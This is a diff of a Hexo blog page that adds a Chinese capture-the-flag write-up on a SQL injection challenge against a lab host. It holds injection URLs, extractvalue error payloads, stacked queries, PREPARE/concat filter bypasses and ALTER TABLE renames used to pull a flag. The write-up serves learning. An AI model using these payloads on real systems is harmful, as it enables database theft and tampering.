@@ -9,7 +9,7 @@
     <meta http-equiv="Cache-Control" content="no-siteapp">
     <title>
         
-            Hexo
+            
         
     </title>
     <link rel="shortcut icon" href="#"/>
@@ -32,150 +32,144 @@
 <meta name="generator" content="Hexo 7.1.1"></head>
 <body>
     <a id="cover"></a>
-    <link type="text/css" rel="stylesheet" href="/css/index.css">
-<div id="count"></div>
-<div id="header" >
+    <link type="text/css" rel="stylesheet" href="/css/post.css">
+<div id="header" class="header">
     <div class="vertical">
         <div class="inner">
             
-                <h1 class="header-title">Dyinglight</h1>
-                <h2 class="header-description" id="hitokoto"></h2>
-                <h3 class="header-info" id="hitokotoAuthor"></h3>
+                <h1 class="header-subtitle"></h1>
+                <div class="header-subinfo">
+                    <p class="article-info-text">
+                        <span>
+                            <i class="iconfont icon-time"></i> 发表时间：2024-03-30
+                        </span>
+                        
+                            
+                                <span id="/2024/03/30/20230330刷题/" class="leancloud_visitors" data-flag-title="">
+                                    <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
+                                </span>
+                            
+                            
+                                <span>
+                                    <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2024/03/30/20230330刷题/"></span>
+                                </span>
+                              
+                        
+                    </p>
+                    
+                    
+                </div>
             
         </div>
     </div>
     
-        <a class="scroll-down" href="javascript:;" target="_self" data-offset="-45">
-            <i class="scroll-down-icon iconfont icon-return"></i>
-        </a>
-    
 </div>
 <div id="container">
     
-        
-            <!-- 首页 -->
-            <div class="articles">
+        <!-- 文章页面 -->
+        <div id="article">
+            <div class="toc"></div>
+            <div class="article-body">
+                <h1 id="2024-3-30-主站刷题"><a href="#2024-3-30-主站刷题" class="headerlink" title="2024&#x2F;3&#x2F;30 主站刷题"></a>2024&#x2F;3&#x2F;30 主站刷题</h1><h2 id="1-ez-sql"><a href="#1-ez-sql" class="headerlink" title="1.ez_sql"></a>1.ez_sql</h2><p>1.测试注入类型<br>  回显 2-1不等于1，字符型</p>
+<p>2.判断闭合方式</p>
+<p>  1‘看报错，得知单引号闭合</p>
+<p>3.查列数</p>
+<p>group by得2列</p>
+<p>4.union select查询</p>
+<p>select被过滤，绕过方法也失效，采用报错注入</p>
+<p><a target="_blank" rel="noopener" href="http://210.30.97.133:28043/?inject=1%27%7C%7Cextractvalue(1,concat(%27$%27,(database())))%7C%7C%271%27=%271">http://210.30.97.133:28043/?inject=1&#39;||extractvalue(1,concat(&#39;$&#39;,(database())))||&#39;1&#39;=&#39;1</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error 1105 : Unknown XPATH variable at: &#x27;$supersqli&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>拿表名</p>
+<p>发现过滤了&#x3D;&#x3D;.&#x3D;&#x3D;号，还过滤了where，查资料发现可以堆叠注入</p>
+<p><a target="_blank" rel="noopener" href="http://210.30.97.133:28043/?inject=1%27;show">http://210.30.97.133:28043/?inject=1&#39;;show</a> databases;#</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(11) &quot;ctftraining&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(18) &quot;information_schema&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;mysql&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(18) &quot;performance_schema&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(9) &quot;supersqli&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;test&quot;</span><br><span class="line">&#125;`</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="http://210.30.97.133:28043/?inject=1%27;show">http://210.30.97.133:28043/?inject=1&#39;;show</a> tables;#</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(16) &quot;1919810931114514&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;words&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>select被过滤</p>
+<p><a target="_blank" rel="noopener" href="http://210.30.97.133:28043/?inject=1%27;show">http://210.30.97.133:28043/?inject=1&#39;;show</a> columns from words;# 没有flag</p>
+<p><a target="_blank" rel="noopener" href="http://210.30.97.133:28085/?inject=1%27;show">http://210.30.97.133:28085/?inject=1&#39;;show</a> columns from `1919810931114514`;# &#x3D;&#x3D;反单引号括住&#x3D;&#x3D;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;varchar(100)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>?inject&#x3D;1’;select flag from flag;# 会过滤select，到这没思路去看<a href=https://blog.csdn.net/weixin_44632787/article/details/118737571>wp</a>了</p>
+<p>方法一：MySQL中查询语句handler：</p>
+<ol>
+<li><code>handler 【表名】 open;</code> &#x2F;&#x2F; 打开某个表</li>
+<li><code>handler 【表名】 read first || next;</code> &#x2F;&#x2F; 读取表里第一行或者下一行的数据</li>
+<li><code>handler 【表名】 close;</code> &#x2F;&#x2F; 关闭该表</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">handler `1919810931114514` open;</span><br><span class="line">handler `1919810931114514` read first;</span><br><span class="line">handler `1919810931114514` close;</span><br></pre></td></tr></table></figure>
+
+<p>方法二：</p>
+<ol>
+<li><code>PREPARE 【自定义名】 FROM 【自定义的SQL查询语句】;</code>&#x2F;&#x2F;生成</li>
+<li><code>EXECUTE 【自定义名】;//执行</code></li>
+<li><code>DEALLOCATE PREPARE 【自定义名】;</code>&#x2F;&#x2F;释放</li>
+</ol>
+<p>由于select被过滤，concat绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PREPARE Hack_SQL from concat(&#x27;s&#x27;,&#x27;elect&#x27;, &#x27; * from `1919810931114514` &#x27;);</span><br><span class="line">EXECUTE Hack_SQL;</span><br><span class="line">DEALLOCATE PREPARE Hack_SQL;</span><br></pre></td></tr></table></figure>
+
+<p>或者ascii编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PREPARE Hack_SQL from concat(char(115,101,108,101,99,116), &#x27; * from `1919810931114514`&#x27;);</span><br><span class="line">EXECUTE Hack_SQL;</span><br><span class="line">DEALLOCATE PREPARE Hack_SQL;#</span><br></pre></td></tr></table></figure>
+
+<p>方法三</p>
+<p>由于前端提供查询的数据库为words，但是flag在数据库1919810931114514里。并且可以猜测后台的SQL查询语句为：select * from words where id&#x3D;【你输入的id】</p>
+<p>1.所以我们需要先将数据库words改成其它的数据库名<br>2.再把数据库1919810931114514改名为words<br>3.并且把（改名前）1919810931114514数据库的字段flag改名成id</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alter table words rename to words1;</span><br><span class="line">alter table `1919810931114514` rename to words;</span><br><span class="line">alter table words change flag id varchar(100);</span><br></pre></td></tr></table></figure>
+
+<p>改完之后输入?inject&#x3D;1’ or 1&#x3D;1;   显示flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(42) &quot;flag&#123;590b74d2-2d4d-41f7-bb0e-137622e5043b&#125;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>参考文章 <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44632787/article/details/118737571">https://blog.csdn.net/weixin_44632787/article/details/118737571</a></p>
+</blockquote>
+
                 
-                    <div class="article">
-                        <div class="article-title">
-                            <a href="/2024/03/30/20230330%E5%88%B7%E9%A2%98/"></a>
-                            
-                        </div>
-                        <div class="article-abstract">
-                            
-                        </div>
-                        <div class="clear"></div>
-                        <div class="article-info">
-                            <span>
-                                <i class="iconfont icon-time"></i> 发表时间：2024-03-30
-                            </span>
-                            
-                                
-                                    <span id="/2024/03/30/20230330刷题/" class="leancloud_visitors" data-flag-title="">
-                                        <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                                    </span>
-                                
-                                
-                                    <span>
-                                        <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2024/03/30/20230330刷题/"></span>
-                                    </span>
-                                
-                            
-                        </div>
-                        <div class="clear"></div>     
-                    </div>
+                <p class="end">__END__</p>
+            </div>
+            <div class="article-footer">
+                <div class="suffix-box">
+    <div class="suffix-box-left">
+        <img src="/image/sidebar/RL02.jpg" alt="Dyinglight">
+    </div>
+    <div class="suffix-box-right">
+        <span class="suffix-box-title">文章作者：</span>Dyinglight
+        <br>
+        <span class="suffix-box-title">文章出处：</span><a href="/2024/03/30/20230330%E5%88%B7%E9%A2%98/" target="_blank"></a>
+        <br>
+        <span class="suffix-box-title">作者签名：</span>简单地活着, 肆意又精彩.
+        <br>
+        <span class="suffix-box-title">关于主题：</span><a href="https://github.com/first19326/Hexo-LiveForCode" target="_blank">Hexo - Live For Code</a>
+        <br>
+        <span class="suffix-box-title">版权声明：</span>文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" title="BY-NC-SA" target="_blank">BY-NC-SA</a> 许可协议，转载请注明出处
+        <br>
+    </div>
+    <div style="clear: both;"></div>
+</div>
                 
-                    <div class="article">
-                        <div class="article-title">
-                            <a href="/2024/03/24/DUTCTF2024-wp/">DUTCTF2024 wp</a>
-                            
-                        </div>
-                        <div class="article-abstract">
-                            
-                        </div>
-                        <div class="clear"></div>
-                        <div class="article-info">
-                            <span>
-                                <i class="iconfont icon-time"></i> 发表时间：2024-03-24
-                            </span>
-                            
-                                
-                                    <span id="/2024/03/24/DUTCTF2024-wp/" class="leancloud_visitors" data-flag-title="DUTCTF2024 wp">
-                                        <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                                    </span>
-                                
-                                
-                                    <span>
-                                        <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2024/03/24/DUTCTF2024-wp/"></span>
-                                    </span>
-                                
-                            
-                        </div>
-                        <div class="clear"></div>     
-                    </div>
                 
-                    <div class="article">
-                        <div class="article-title">
-                            <a href="/2024/03/24/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/">第一篇文章</a>
-                            
-                        </div>
-                        <div class="article-abstract">
-                            
-                        </div>
-                        <div class="clear"></div>
-                        <div class="article-info">
-                            <span>
-                                <i class="iconfont icon-time"></i> 发表时间：2024-03-24
-                            </span>
-                            
-                                
-                                    <span id="/2024/03/24/第一篇文章/" class="leancloud_visitors" data-flag-title="第一篇文章">
-                                        <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                                    </span>
-                                
-                                
-                                    <span>
-                                        <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2024/03/24/第一篇文章/"></span>
-                                    </span>
-                                
-                            
-                        </div>
-                        <div class="clear"></div>     
-                    </div>
-                
-                    <div class="article">
-                        <div class="article-title">
-                            <a href="/2024/03/24/hello-world/">Hello World</a>
-                            
-                        </div>
-                        <div class="article-abstract">
-                            
-                        </div>
-                        <div class="clear"></div>
-                        <div class="article-info">
-                            <span>
-                                <i class="iconfont icon-time"></i> 发表时间：2024-03-24
-                            </span>
-                            
-                                
-                                    <span id="/2024/03/24/hello-world/" class="leancloud_visitors" data-flag-title="Hello World">
-                                        <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                                    </span>
-                                
-                                
-                                    <span>
-                                        <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2024/03/24/hello-world/"></span>
-                                    </span>
-                                
-                            
-                        </div>
-                        <div class="clear"></div>     
-                    </div>
-                
+                <div class="article-prev-next">
+                    
+                    
+                        <a href="/2024/03/24/DUTCTF2024-wp/" class="next-prefix">» </a> 下一篇：    <a href="/2024/03/24/DUTCTF2024-wp/" title="发布于 2024-03-24 09:01">DUTCTF2024 wp</a>
+                    
+                </div>
             </div>
             
-            
+    <div class="article-comments">
         
+            <div class="comments-title">
+                评论列表
+            </div>
+        
+        <div class="comments-content"></div>
+    </div>
+    
+ 
+        </div>
     
 </div>
     <div id="footer">
@@ -207,7 +201,7 @@
             <div class="menu-list">
                 <ul>
                     
-                        <li class=" active "><a href="/" class="" target="_self"><span class="iconfont icon-home-fill"></span>首页</a></li>
+                        <li class=""><a href="/" class="" target="_self"><span class="iconfont icon-home-fill"></span>首页</a></li>
                     
                         <li class=""><a href="/category" class="" target="_self"><span class="iconfont icon-folder-fill"></span>分类</a></li>
                     
